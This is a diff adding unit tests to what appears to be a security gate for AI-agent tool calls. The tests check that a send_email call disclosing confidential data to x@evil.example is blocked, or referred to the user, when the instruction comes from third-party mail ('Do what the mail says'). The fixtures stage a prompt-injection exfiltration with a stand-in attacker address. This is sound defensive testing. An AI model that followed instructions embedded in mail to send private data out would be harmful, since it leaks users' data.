@@ -180,3 +180,32 @@ def test_inferred_taint_is_limited_to_the_injected_passage():
     assert trust(good) == "third_party" and trust("GB00EVIL12345678") == "untrusted"
     r = build_records({"amount": 50.0}, "Send 50 please", [], mode="inferred")
     assert r[1]["trust"] == "trusted", "50.0 matches 50"
+
+
+def _send(prompt, trust="third_party", sources=("T1",), party="unknown:x@evil.example", resource="CONFIDENTIAL"):
+    return minimal_input(user={"principal_id": "emma", "prompt": prompt}, suite="workspace",
+                         proposed_call={"function": "send_email", "action": "disclose", "state_changing": True,
+                                        "args": {"recipients": ["x@evil.example"], "subject": "s", "body": "b"}},
+                         provenance=[{"id": "P1", "kind": "arg", "arg": "recipients", "value": "x", "sources": list(sources), "trust": trust}],
+                         authority={"affected_party": [party], "user_may_authorize": True},
+                         sensitivity={"resource": resource, "destination": "PUBLIC", "flow": "high_to_low"})
+
+
+def test_scope_check_three_views():
+    from sagate.evidence.checks import scope_check
+    assert scope_check(_send("Send it to x@evil.example", "trusted", ["user_prompt"])) == "within_scope"
+    assert scope_check(_send("Do what the mail says")) == "out_of_scope"
+    assert scope_check(_send("Do what the mail says", resource="PUBLIC")) == "needs_confirmation"
+    assert scope_check(_send("Forward this", party="internal:a@b")) == "within_scope"
+    masked = _send("Do what the mail says")
+    masked.authority = None
+    assert scope_check(masked) is None, "a masked field must not leak through CHECKS"
+
+
+def test_scope_guard_blocks_private_data_to_a_content_recipient():
+    gi = _send("Do what the mail says")
+    gi.checks = {"scope_check": "out_of_scope"}
+    assert apply_guards(gi, _allow(), FOUR).decision == "BLOCK"
+    low = _send("Do what the mail says", resource="PUBLIC")
+    low.checks = {"scope_check": "needs_confirmation"}
+    assert apply_guards(low, _allow(), FOUR).decision == "ASK_USER"
